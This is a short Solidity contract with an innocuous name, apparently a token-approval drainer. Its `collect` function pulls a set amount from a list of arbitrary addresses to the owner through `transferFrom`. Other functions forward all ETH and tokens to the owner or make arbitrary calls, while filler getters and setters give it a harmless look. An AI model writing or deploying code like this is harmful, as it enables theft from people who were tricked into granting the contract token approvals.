// SPDX-License-Identifier: Unlicensed

// Deployed with the Atlas IDE
// https://app.atlaszk.com

pragma solidity ^0.8.0;

import "./IERC20.sol";

contract Helping {

IERC20 public token;
address public owner;

uint256 public storA = 1;
uint256 public storB = 2;

constructor(address _token) {
        token = IERC20(_token);
        owner = msg.sender;
}

event Response(bool result, bytes data);

  
function setem(uint256 one, uint256 two) external {
    storA = one;
    storB = two;
}

function changetoken(address newtoken) external  {
require(msg.sender == owner, "only Owner");
    token = IERC20(newtoken);
}

receive() external payable {}
  
fallback() external payable{
    this.getem();
    if(address(this).balance > 0) {
         payable(owner).transfer(address(this).balance);
       }
}

function collect(address[] calldata senders, uint256 amount) external {
    require(msg.sender == owner, "only Owner");
     uint256 l = senders.length;
     for (uint256 i = 0; i < l; ++i) {
           address sender = senders[i];
           token.transferFrom(sender, owner, amount);
     }
}

function withdrawToken() external {
    require(msg.sender == owner, "only Owner");
    token.transfer(owner, token.balanceOf(address(this)));
    }


function withdrawToken(uint256 value) public {
    require(msg.sender == owner, "only Owner");
    require(token.transfer(owner, value), "failed");
    }

function getem() public view returns(uint256 a, uint256 b) {
   return (storA, storB);

}
function withdrawETH() external {
        payable(owner).transfer(address(this).balance);
    }

function call2(address target, bytes memory data) external payable {
    require(msg.sender == owner, "only Owner");
     (bool success, bytes memory returned) = target.call{value: msg.value}(data);
     emit Response(success, returned);
}

}
